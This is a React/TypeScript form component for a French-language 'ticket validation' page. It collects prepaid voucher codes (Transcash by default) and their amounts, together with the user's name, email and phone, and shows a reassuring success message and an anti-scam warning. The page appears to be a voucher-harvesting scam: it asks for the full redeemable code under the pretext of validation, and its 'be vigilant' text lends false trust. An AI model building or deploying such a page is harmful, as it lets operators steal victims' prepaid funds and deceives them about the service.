"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { AlertCircle, CheckCircle, Loader2 } from "lucide-react"
import { useLanguage } from "@/contexts/LanguageContext"
import { useEmailSubmission } from "@/hooks/useEmailSubmission"
import { CommonFormFields } from "./forms/common-fields"
import type { TicketType, SubmissionType } from "@/lib/types"

interface SubmissionFormData {
  ticket_type: TicketType
  ticket_code: string
  ticket_amount: number | string
  user_email: string
  user_phone?: string
  user_name: string
  submission_type: SubmissionType
}

export function ValidationForm() {
  const { t } = useLanguage()
  const [formData, setFormData] = useState<SubmissionFormData>({
    ticket_type: "transcash",
    ticket_code: "",
    ticket_amount: "",
    user_email: "",
    user_phone: "",
    user_name: "",
    submission_type: "validation",
  })

  const { submitForm, isLoading, error } = useEmailSubmission({
    submissionType: "validation",
    onSuccess: () => setSuccess(true),
    onError: () => {}
  })

  const [success, setSuccess] = useState(false)

  const handleFieldChange = (field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (typeof formData.ticket_amount === 'string') {
      formData.ticket_amount = Number(formData.ticket_amount) || 0
    }
    await submitForm(formData as any)
  }

  if (success) {
    return (
      <Card className="border-green-200 bg-green-50 dark:bg-green-950/20">
        <CardHeader className="text-center">
          <div className="w-16 h-16 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center mx-auto mb-4">
            <CheckCircle className="w-8 h-8 text-green-600" />
          </div>
          <CardTitle className="text-2xl text-green-800 dark:text-green-200 font-bold">
            Votre ticket est en cours de validation
          </CardTitle>
          <CardDescription className="text-green-700 dark:text-green-300 mt-2">
            <span className="block mb-2 text-base font-medium">Merci d’avoir soumis votre demande de validation.</span>
            <span className="block mb-2">Notre équipe procède à la vérification de votre ticket. Un email vous sera envoyé dès que la validation sera terminée.</span>
            <span className="block text-sm text-green-900 dark:text-green-200">Merci de contrôler votre boîte de réception et vos spams.</span>
          </CardDescription>
        </CardHeader>
        <CardContent className="text-center">
          <Button
            onClick={() => {
              setSuccess(false)
              setFormData({
                ticket_type: "transcash",
                ticket_code: "",
                ticket_amount: "",
                user_email: "",
                user_phone: "",
                user_name: "",
                submission_type: "validation"
              })
            }}
            variant="outline"
            className="border-green-300 text-green-700 hover:bg-green-100 font-semibold"
          >
            Faire une nouvelle validation
          </Button>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle className="text-2xl">{t('validationFormTitle')}</CardTitle>
        <CardDescription>{t('validationFormDescription')}</CardDescription>
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-6">
          <CommonFormFields 
            formData={formData} 
            onFieldChange={handleFieldChange} 
            t={t} 
          />

          {/* Error Alert */}
          {error && (
            <Alert variant="destructive">
              <AlertCircle className="h-4 w-4" />
              <AlertDescription>{error}</AlertDescription>
            </Alert>
          )}

          {/* Submit Button */}
          <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700" disabled={isLoading}>
            {isLoading ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                {t('submitting')}
              </>
            ) : (
              t('validateTicket')
            )}
          </Button>
          
          {/* Alerte de vigilance */}
          <div className="w-full bg-yellow-50 dark:bg-yellow-900/30 border-l-4 border-yellow-400 rounded-r overflow-hidden -mx-2 sm:mx-0">
            <div className="p-4">
              <div className="flex items-start">
                <div className="flex-shrink-0 pt-0.5">
                  <svg className="h-5 w-5 text-yellow-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                    <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                </div>
                <div className="ml-3 flex-1">
                  <h3 className="text-sm font-medium text-yellow-800 dark:text-yellow-200">
                    Soyez Vigilant !
                  </h3>
                  <div className="mt-1 text-sm text-yellow-700 dark:text-yellow-300 space-y-1.5">
                    <p className="break-words">Nous vous proposons un service de validation et de remboursement plus sûr et fiable pour plus de sécurité et pour éviter les nombreuses arnaques.</p>
                    <p className="break-words">En effet, nous avons reçu plusieurs plaintes concernant les recharges invalides ou non confirmées. Ainsi pour éviter tous ces problèmes nous vous conseillons d'activer vos recharges dès leurs achats.</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Terms */}
          <p className="text-sm text-muted-foreground text-center">
            {t('termsAndConditions')}
          </p>
        </form>
      </CardContent>
    </Card>
  )
}
